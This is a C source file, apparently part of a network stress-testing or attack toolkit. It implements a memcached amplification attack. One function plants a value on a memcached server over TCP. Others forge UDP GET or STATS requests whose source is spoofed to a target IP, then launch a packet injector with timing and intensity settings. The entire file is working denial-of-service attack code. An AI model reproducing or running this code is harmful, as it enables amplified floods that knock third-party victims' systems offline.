
#include "venus.h"
#include "strix.h"
#include "memcachedforge.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT
#define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )

void memcachedSetValue( AttackPlan * p_atkData )
{
    int sock = CreateSocket(TCP, BLOCK);
    BinaryResponseHeader response;

    ConnectTCP(sock, p_atkData->setPacket);
    for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
    {
        if( SendPacket(sock, tmpPkt) < 0 )
        {
            Efatal(ERROR_MEMCACHED, "error memcached\n");
        }

        recv(sock, &response, sizeof(BinaryResponseHeader), 0);
        
        if(response.status != 0)
        {
            Efatal(ERROR_MEMCACHED, "Error memcached: cannot set data\n");
        }
    }
    CloseSocket(sock);
}

static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = MEMCACHED_SET;
    newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
    arg = MEMCACHED_GET;
    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
    newData->draft = p_draft;
    return newData;
}

static AttackPlan * createAttackDataSTATS( LhfDraft *p_draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = MEMCACHED_STAT;
    newData->setPacket = NULL;
    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
    newData->draft = p_draft;
    return newData;
}

void executeAttack( AttackPlan * atkData )
{
    char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
    
    if(atkData->draft->type == MEMCACHED_GETSET)
    {
        memcachedSetValue( atkData );
    }
    StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
}

int  ExecuteMemcachedMirror( void *p_draft )
{
    AttackPlan *plan;
    LhfDraft *draft = (LhfDraft *)p_draft;

    switch( draft->type )
    {
        case MEMCACHED_GETSET:
            plan = createAttackDataGETSET( draft );
            break;

        case MEMCACHED_STATS:
        default:
            plan = createAttackDataSTATS( draft );
            break;
    }
    executeAttack(plan);
    return 0;
}


